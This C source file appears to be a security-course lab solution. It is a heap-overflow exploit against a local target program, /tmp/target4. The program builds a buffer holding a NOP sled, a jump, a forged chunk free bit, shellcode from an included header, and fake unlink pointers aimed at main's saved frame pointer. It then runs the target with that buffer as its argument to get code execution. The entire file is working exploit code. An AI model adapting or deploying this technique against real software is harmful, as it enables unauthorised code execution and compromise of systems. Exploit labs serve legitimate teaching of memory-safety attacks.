#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target4"

int main(void)
{
  char *args[3];
  char *env[1];
  
  char buf[1024];

  memset(buf, 0x90, 1024);
  memcpy(buf, "\xeb\x06\x90\x90", 4); // \xeb is jmp
  memcpy(buf + 4, "\x01\x90\x90\x90", 4); // set free bit
  memcpy(buf + 8, shellcode, 45);
  
  int p_ptr = 0x8059878; // x p
  int q_ptr = 0x8059950; // x q
  int q_chunk = q_ptr - p_ptr - 8; // location of q chunk

  memcpy(buf + q_chunk, "\x78\x98\x05\x08", 4); // p_ptr
  memcpy(buf + q_chunk + 4, "\x7c\xfa\xff\xbf", 4); // ebp of main + 4

  args[0] = TARGET;
  args[1] = buf;
  args[2] = NULL;
  env[0] = NULL;

  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;
}
